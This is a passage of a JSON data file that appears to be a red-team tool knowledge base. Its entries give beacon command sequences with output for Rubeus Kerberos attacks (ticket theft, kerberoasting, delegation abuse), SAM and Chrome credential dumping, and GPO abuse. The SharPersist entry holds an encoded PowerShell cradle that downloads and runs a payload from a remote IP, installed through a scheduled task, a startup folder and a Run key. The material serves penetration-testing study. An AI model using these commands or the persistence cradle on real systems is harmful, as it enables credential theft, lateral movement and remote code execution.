AM |\n ------------------------------------------------------------------------------\n ``````\n2. Extract the ticket\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap\n\n[*] Target service  : krbtgt\n[*] Target LUID     : 0x462eb\n[*] Current LUID    : 0x3e7\n\n  UserName                 : doe\n  Domain                   : EDU\n  LogonId                  : 0x462eb\n  UserSID                  : S-1-5-21-3263068140-2042698922-2891547269-1122\n  AuthenticationPackage    : Kerberos\n  LogonType                : Interactive\n  LogonTime                : 5/11/2022 2:34:03 PM\n  LogonServer              : DC-2\n  LogonServerDNSDomain     : edu.evil.corp\n  UserPrincipalName        : doe@edu.evil.corp\n\n ServiceName           :  krbtgt/edu.evil.corp\n ServiceRealm          :  edu.evil.corp\n UserName              :  doe\n UserRealm             :  edu.evil.corp\n StartTime             :  5/11/2022 2:34:03 PM\n EndTime               :  5/12/2022 12:34:03 AM\n RenewTill             :  5/18/2022 2:34:03 PM\n Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n KeyType               :  aes256_cts_hmac_sha1\n Base64(key)           :  oh0gqFF8D81ijGlce+jyc0yMtHYaDrl8AM0b4+BqO8E=\n Base64EncodedTicket   :\n\n [...ticket...]\n``````\n3. Create a sacrificial logon session or use \n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe\n\n[*] Action: Create Process (/netonly)\n[*] Showing process : False\n[+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\n[+] ProcessID       : 4872\n[+] LUID            : 0x92a8c\n``````\n4. Use [[Pass-the-Ticket]] to pass the extracted TGT into the logon session via /luid\n``````beacon\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]\n\n[*] Action: Import Ticket\n[*] Target LUID: 0x92a8c\n[+] Ticket successfully imported!\n``````\n5. Steal the access token\n``````beacon\nsteal_token 4872\n[+] Impersonated NT AUTHORITY\\SYSTEM\n\nbeacon> ls \\\\srv2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Make_token / new logon session\n```beacon\nmake_token EXT\\i.wood abcdefg\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe ptt /ticket:awdawd\n```\n\n## [[Kerberoasting]]\n\u26a0\ufe0f This will kerberoast ALL accounts with SPN's!\n#OPSEC only do targeted kerberoast\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe kerberoast /simple /nowrap\n\n[*] Action: Kerberoasting\n[*] Searching the current domain for Kerberoastable users\n[*] Total kerberoastable users : 2\n\n$krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]\n$krb5tgs$23$*svc_honey$edu.evil.corp$HoneySvc/fake.edu.evil.corp*$[...hash...]\n``````\n\n## Targeted [[Kerberoasting]]\n1. Identify users: [[ADSearch#Identify kerberoastable Users]]\n2. Targeted [[Kerberoasting]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe kerberoast /user:svc_mssql /nowrap\n\n[*] Action: Kerberoasting\n[*] Target User            : svc_mssql\n[*] Searching the current domain for Kerberoastable users\n[*] Total kerberoastable users : 1\n[*] SamAccountName         : svc_mssql\n[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=edu,DC=evil,DC=corp\n[*] ServicePrincipalName   : MSSQLSvc/srv1.edu.evil.corp:1433\n[*] PwdLastSet             : 5/14/2022 1:28:34 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]\n``````\n3. Cracking with [[Hashcat#Cracking krb5tgs]]\n\n## [[AS-REP Roasting]]\n1. Identify users: [[ADSearch#Identify as-rep roastable user]]\n2. [[AS-REP Roasting]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asreproast /user:svc_oracle /nowrap\n\n[*] Action: AS-REP roasting\n\n[*] Target User            : svc_oracle\n[*] Target Domain          : edu.evil.corp\n\n[*] Searching path 'LDAP://dc-2.edu.evil.corp/DC=edu,DC=evil,DC=corp' for AS-REP roastable users\n[*] SamAccountName         : svc_oracle\n[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=edu,DC=evil,DC=corp\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building AS-REQ (w/o preauth) for: 'edu.evil.corp\\svc_oracle'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n\n $krb5asrep$svc_oracle@edu.evil.corp:F3B1A1 [...snip...] D6D049\n``````\n3. Cracking with [[Hashcat#Cracking krb5asrep]]\n\n## [[Unconstrained Delegation]]\nRequires Admin\nMonitor with [[Rubeus]] for new cached TGT's\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe monitor /targetuser:patrick /interval:10\n\n[*] Action: TGT Monitoring\n[*] Target user     : patrick\n[*] Monitoring every 10 seconds for new TGTs\n\njobs\n\njobkill 1\n``````\n\nWrite the base64 decoded string to a `.kirbi` file, create a new sacrificial logon session, pass the TGT [[Overpass-the-Hash#Manual]]\n\n## [[Constrained Delegation]]\nRequire Admin\n1. Gather computer aes256 hash via [[eKeys]]\n2. Automatically request TGS for specific service\nWhere:\n- `/impersonateuser` is the user we want to impersonate. `patrick` is a domain admin but you want to ensure this user has local admin access to the target (WKSTN2).\n- `/msdsspn` is the service principal name that SRV2 is allowed to delegate to.\n- `/user` is the principal allowed to perform the delegation.\n- `/aes256` is the AES256 key of the `/user`.\n- `/opsec` tells Rubeus to more closely mimic genuine S4U2Self and S4U2Proxy requests (can only be used with `aes256`).\n- `/ptt` [[Pass-the-Ticket]], tells Rubeus to pass the generated tickets directly into the current logon session.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe s4u /impersonateuser:patrick /msdsspn:cifs/wkstn2.edu.evil.corp /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\srv2$'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIFLD [...snip...] MuSU8=\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'\n[+] Sequence number is: 1703507608\n[*] Sending S4U2self request\n[+] S4U2self success!\n[*] Got a TGS for 'patrick' to 'SRV2$@edu.evil.corp'\n[*] base64(ticket.kirbi):\n\n doIFfj [...snip...] JWLTIk\n\n[*] Impersonating user 'patrick' to target SPN 'cifs/wkstn2.edu.evil.corp'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2proxy request for service: 'cifs/wkstn2.edu.evil.corp'\n[+] Sequence number is: 326551889\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'cifs/wkstn2.edu.evil.corp':\n\n doIGwj [..snip...] ljLmlv\n\n[+] Ticket successfully imported!\n\nbeacon> ls \\\\wkstn2.edu.evil.corp\\c$\n  \n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/19/2022 14:35:19   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n``````\n\n## Alternate Service Name\nThis is an special case of [[Constrained Delegation]], were the service is not useful.\nWe can request a TGS for any service run by DC-2, using `/altservice` flag in Rubeus.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.edu.evil.corp /altservice:cifs /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\srv2$'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIFLD [...snip...] MuSU8=\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'\n[+] Sequence number is: 1421721239\n[*] Sending S4U2self request\n[+] S4U2self success!\n[*] Got a TGS for 'Administrator' to 'SRV2$@edu.evil.corp'\n[*] base64(ticket.kirbi):\n\n doIFfj [...snip...] WLTIk\n\n[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.edu.evil.corp'\n[*]   Final tickets will be for the alternate services 'cifs'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2proxy request for service: 'eventlog/dc-2.edu.evil.corp'\n[+] Sequence number is: 1070349348\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] Substituting alternative service name 'cifs'\n[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.edu.evil.corp':\n\n doIGvD [...snip...] ljLmlv\n\n[+] Ticket successfully imported!\n\nbeacon> ls \\\\dc-2.edu.evil.corp\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Check stored TGT\nUse `Rubeus describe` to show information about the ticket.\n``````beacon\nexecute-assembly Rubeus.exe describe /ticket:C:\\Users\\Administrator\\Desktop\\wkstn2-s4u.kirbi\n\n[*] Action: Describe Ticket\n\n  ServiceName              :  WKSTN2$\n  ServiceRealm             :  edu.evil.corp\n  UserName                 :  patrick\n  UserRealm                :  edu.evil.corp\n  StartTime                :  2/28/2022 7:30:02 PM\n  EndTime                  :  3/1/2022 5:19:32 AM\n  RenewTill                :  1/1/0001 12:00:00 AM\n  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable\n  KeyType                  :  aes256_cts_hmac_sha1\n  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=\n``````\n\n## Ask TGT via certificate\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /aes256 /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Isabel Yates, CN=Users, DC=evil, DC=corp \n[*] Building AS-REQ (w/ PKINIT preauth) for: 'evil.corp\\nglover'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIGNjCCB[...snip...]pYy5pbw==\n\n  ServiceName              :  krbtgt/evil.corp\n  ServiceRealm             :  EVIL.CORP\n  UserName                 :  nglover\n  UserRealm                :  EVIL.CORP\n  StartTime                :  1/18/2022 4:38:26 PM\n  EndTime                  :  1/19/2022 2:38:26 AM\n  RenewTill                :  1/25/2022 4:38:26 PM\n  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  :  aes256_cts_hmac_sha1\n  Base64(key)              :  unJ966veiMXllOu4n88hvAcX/6j71To9JJU5Ec48Pds=\n  ASREP (key)              :  6F8361B5177CCC416E67A297C9D61AC975DEAA9E0505DE86657F16EAE9AD8F72\n``````\n\n## [[Overpass-the-Hash]]\nRubeus allows us to perform opth without needing elevated privileges. The process to follow is:\n\n-   Request a TGT for the user we want to impersonate.\n-   Create a sacrificial logon session.\n-   Pass the TGT into that logon session.\n-   Access the target resource.\n\n#OPSEC Rubeus also has an `/opsec` argument which tells it to send the request without pre-auth, to more closely emulate genuine Kerberos traffic.\n\n### SHA256\n1. Request a hash via [[eKeys]] or [[LSASS dumping]] (not recommended anymore)\n2. Ask for a TGT\n```````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec\n\n[*] Action: Ask TGT\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:58:21 PM\n  EndTime               :  7/10/2022 12:58:21 AM\n  RenewTill             :  7/16/2022 2:58:21 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  aes256_cts_hmac_sha1\n  Base64(key)           :  x4F1hxBrfwvgleEHnYbg9KV5fch2VOS5m36IO/srA0g=\n```````\n\n### RC4\n``````beacon\nMost public articles demonstrate using the NTLM hash to request the TGT.\n\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using rc4_hmac hash: 4ffd3eabdce2e158d923ddec72de979e\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:46:58 PM\n  EndTime               :  7/10/2022 12:46:58 AM\n  RenewTill             :  7/16/2022 2:46:58 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  rc4_hmac\n  Base64(key)           :  Z1/VMlSwxK4jrbL8qmjvNw==\n``````\n\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T19:24:57Z"
  },
  {
    "name": "ruler",
    "phases": [
      "01. Initial Access",
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux",
      "Windows"
    ],
    "source": "https://github.com/sensepost/ruler",
    "description": "Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Find Mail Server]] [[Phishing]] [[Internal Phishing]]\n\n",
    "commands": [],
    "latest_commit": "2021-02-19T09:28:07Z"
  },
  {
    "name": "Sandman",
    "phases": [
      "01. Initial Access"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/Idov31/Sandman",
    "description": "Sandman is a NTP based backdoor for red team engagements in hardened networks.",
    "undetected": [],
    "detected": [],
    "content": "## [[Loader]]\n\n\n",
    "commands": [],
    "latest_commit": "2023-04-22T20:53:51Z"
  },
  {
    "name": "sc",
    "phases": [
      "03. Host Enumeration"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/de-de/windows-server/administration/windows-commands/sc-config",
    "description": "\u00c4ndert den Wert der Eintr\u00e4ge eines Diensts in der Registrierung und in der Service Control Manager-Datenbank.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Services]]\n* Start service  \n'sc [<ServerName>] start <ServiceName>'\n* Stop dervice\n'sc [<ServerName>] stop <ServiceName>' \n* List all services\n'sc queryex type=service state=all'\n* List service names only\n'sc queryex type=service state=all | find /i \"SERVICE_NAME:\"'\n* Search for specific service\n'sc queryex type=service state=all | find /i \"SERVICE_NAME: myService\"'\n* Get security identifier, [read more](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)  \n'sc.exe sdshow [service_short_name]'\n\n\n",
    "commands": [
      {
        "id": "643ef03f-1b97-47fb-a7b5-1937a62c23bf",
        "name": "Create new service",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "sc.exe create CustomService binpath=\"\\\\c$\\temp\\customservice.exe\""
      },
      {
        "id": "a38a805e-0f8a-44a7-a6d7-645667461264",
        "name": "Get service configuration",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "sc.exe qc CustomService"
      },
      {
        "id": "a38a805e-0f8a-44a7-a6d7-645347461264",
        "name": "Get service status",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "sc.exe query CustomService"
      },
      {
        "id": "82a18db6-dac9-4828-b230-eceb6f67c9bc",
        "name": "Set new binPath",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:SERVICES"
        ],
        "cmd": "sc config wmiApSrv binPath= C:\\Test\\wmiApSrv.exe"
      },
      {
        "id": "3a84935f-e747-4eea-9437-bfcdc8aae676",
        "name": "Start service",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:SERVICES"
        ],
        "cmd": "sc start wmiApSrv"
      }
    ]
  },
  {
    "name": "Seatbelt",
    "phases": [
      "03. Host Enumeration",
      "09. AD Misconfigurations",
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/GhostPack/Seatbelt",
    "description": "Seatbelt is a .NET application written in C# that has various \"host safety-checks\". The information it gathers includes general OS info, installed antivirus, AppLocker, audit policies, local users and groups, logon sessions, UAC, Windows Firewall and more.",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": [
      {
        "id": "6bd511fa-d052-4e76-94c9-b3e03a7521df",
        "name": "Get systems environment",
        "description": "",
        "tag": "",
        "results": [
          "CRED:HASH"
        ],
        "cmd": "Seatbelt.exe -group=system -outputfile=\"file.txt\""
      },
      {
        "id": "68526be2-af3d-42b6-937f-462603a0b03b",
        "name": "Get UAC",
        "description": "Query the configuration applied to a machine",
        "tag": "",
        "results": [
          "COMPUTER:SEC:UAC"
        ],
        "cmd": "Seatbelt.exe uac\n====== UAC ======\n\nConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries\nEnableLUA (Is UAC enabled?)    : 1"
      },
      {
        "id": "963645d6-23d2-4b05-a0b3-6660d30799ea",
        "name": "Get internet settings",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Seatbelt.exe InternetSettings\n\n  HKCU                       ProxyEnable : 1\n  HKCU                     ProxyOverride : ;local\n  HKCU                       ProxyServer : squid.edu.evil.corp:3128"
      },
      {
        "id": "b0d0fd28-8881-44ec-aaf0-b6ee3eaf4d84",
        "name": "Get token privileges",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:SEC:TOKENPRIVS"
        ],
        "cmd": "Seatbelt.exe TokenPrivileges\n\n====== TokenPrivileges ======\n\nCurrent Token's Privileges\n\n SeAssignPrimaryTokenPrivilege:  DISABLED\n SeIncreaseQuotaPrivilege:  DISABLED\n SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED\n SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeIncreaseWorkingSetPrivilege:  DISABLED\n\n[*] Completed collection in 0.01 seconds"
      }
    ],
    "latest_commit": "2023-03-22T19:40:31Z"
  },
  {
    "name": "Secretsdump",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
    "description": "Dump credentials remote and local via sam",
    "undetected": [],
    "detected": [],
    "content": "# Secretsdump\n\n## [[Security Account Manager]]\nReceiving machine passwords via impacket (Admin):\n    ```powershell\n    # Change permissions of hklm\\security to full access\n    reg save hklm\\sam c:\\temp\\sam.save\n    reg save hklm\\security c:\\temp\\security.save\n    reg save hklm\\system c:\\temp\\system.save\n    secretsdump.py -sam C:\\Users\\ext_ecorp_admin\\Desktop\\sam.save -security C:\\Users\\ext_ecorp_admin\\Desktop\\security.save -system C:\\Users\\ext_ecorp_admin\\Desktop\\system.save LOCAL\n    ```\n\n## References\n\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T15:04:47Z"
  },
  {
    "name": "SessionGopher",
    "phases": [
      "03. Host Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/Arvanaghi/SessionGopher",
    "description": "SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.",
    "undetected": [],
    "detected": [],
    "content": "# Commands\n```ps\n-Thorough: searches all drives for PuTTY private key (.ppk), Remote Desktop Connecton (.rdp), and RSA (.sdtid) files.\n-o: outputs the data to a folder of .csv files\n-iL: provide a file with a list of hosts to run SessionGopher against, each host separated by a newline. Provide the path to the file after -iL.\n-AllDomain: SessionGopher will query Active Directory for all domain-joined systems and run against all of them.\n-Target: a specific host you want to target. Provide the target host after -Target.\n```\n\n## [[Sensitive Files]]\n```ps\nLocally\n. .\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n\nRemote\nhttps://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -Target 10.10.10.10 -u domain.com\\adm-arvanaghi -p s3cr3tP@ss -o\n```\n\n",
    "commands": [],
    "latest_commit": "2022-11-22T21:33:23Z"
  },
  {
    "name": "SharpChromium",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/djhohnstein/SharpChromium",
    "description": "Dump cookies, history, saved logins from chrome",
    "undetected": [],
    "detected": [],
    "content": "# Sharp Chromium\n\n## [[Data Protection API (DPAPI)]]\nDump the Chrome passwords\n``````beacon\nbeacon> execute-assembly C:\\Tools\\SharpChromium\\bin\\Debug\\SharpChromium.exe logins\n\n[*] Beginning Google Chrome extraction.\n\n--- Chromium Credential (User: john) ---\nURL      : \nUsername : john\nPassword : Sup3rman\n\n[*] Finished Google Chrome extraction.\n[*] Done.\n``````\n\n\n\n",
    "commands": [],
    "latest_commit": "2020-10-23T22:28:13Z"
  },
  {
    "name": "SharpDPAPI",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/GhostPack/SharpDPAPI",
    "description": "Dump the private key from a AD CS server",
    "undetected": [],
    "detected": [],
    "content": "# SharpDPAPI\n\n## [[Data Protection API (DPAPI)]]\nDump private keys but requires [[SharpDPAPI#Dump private keys]]\n```beacon\nbeacon> run hostname\ndc-1\n\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n\nbeacon> execute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Debug\\SharpDPAPI.exe certificates /machine\n```\n ![](/Images/Pasted%20image%2020220322003615.png)\n\n\n\n",
    "commands": [],
    "latest_commit": "2023-04-21T18:58:40Z"
  },
  {
    "name": "SharPersist",
    "phases": [
      "03. Host Enumeration",
      "04. Persistence"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/mandiant/SharPersist",
    "description": "Windows persistence toolkit written in C#",
    "undetected": [],
    "detected": [],
    "content": "# SharPersist\n\n## Commands\n``````\n`-t` is the desired persistence technique.\n`-c` is the command to execute.\n`-a` are any arguments for that command.\n`-n` is the name of the task.\n`-m` is to add the task (you can also `remove`, `check` and `list`).\n`-o` is the task frequency.\n\nStartup Folder\n`-f` is the filename to save as.\n\nRunKey\n`-k` is the registry key to modify.\n`-v` is the name of the registry key to create.\n``````\n\n## [[Priv Esc/Scheduled Tasks]]\nCreate a scheduled task with:\n* Powershell x64 bit\n* Name: Updater\n* hourly execute\n``````powershell\n$str = 'IEX ((new-object net.webclient).downloadstring(\"http://10.10.5.120/a\"))'\n\n[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))\n\nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t schtask -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==\" -n \"Updater\" -m add -o hourly\n``````\n\n## [[Startup Folder]]\nAdd to startup folder\nCreates a file called UserEnvSetup in the folowing path:\n`%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\UserEnvSetup.lnk`\n\n\u26a0 Consider the spaces in \"Start Menu\"\n\n``````powershell \nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==\" -f \"UserEnvSetup\" -m add\n``````\n\n## [[Startup Folder]]\nCreate a new regkey with:\n* Registry key name: Updater\n* Registry key to modify: hkcurun | hkcurunonce (`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`)\n\n``````powershell\ncd C:\\ProgramData\nupload C:\\Payloads\\beacon-http.exe\nmv beacon-http.exe updater.exe\nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t reg -c \"C:\\ProgramData\\Updater.exe\" -a \"/q /n\" -k \"hkcurun\" -v \"Updater\" -m add\n``````\n\n",
    "commands": [],
    "latest_commit": "2023-04-10T00:53:02Z"
  },
  {
    "name": "SharpGPOAbuse",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [],
    "source": "https://github.com/FSecureLABS/SharpGPOAbuse",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "# SharpGPOAbuse\n\nSharpGPOAbuse allows a wider range of \"abusive\" configurations to be added to a GPO.\n-> It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to.\n\n## [[Group Policy (GPO)]]\nAdd an Immediate Scheduled Task to existing GPO\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> execute-assembly C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse\\bin\\Debug\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Install Updates\" --Author NT AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\\\dc-2\\software\\pivot.exe\" --GPOName \"PowerShell Logging\"\n\n[+] Domain = edu.evil.corp\n[+] Domain Controller = dc-2.edu.evil.corp\n[+] Distinguished Name = CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\n[+] GUID of \"PowerShell Logging\" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\n[+] Creating file \\\\edu.evil.corp\\SysVol\\edu.evil.corp\\Policies\\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n[+] versionNumber attribute changed successfully\n[+] The version number in GPT.ini was increased successfully.\n[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.\n[+] Done!\n```````\n\n",
    "commands": [],
    "latest_commit": "2020-12-15T14:48:31Z"
  },
  {
    "name": "SharpHound",
    "phases": [
      "06. Domain Enumeration",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/BloodHoundAD/SharpHound",
    "description": "Ingestor for Bloodhound",
    "undetected": [],
    "detected": [],
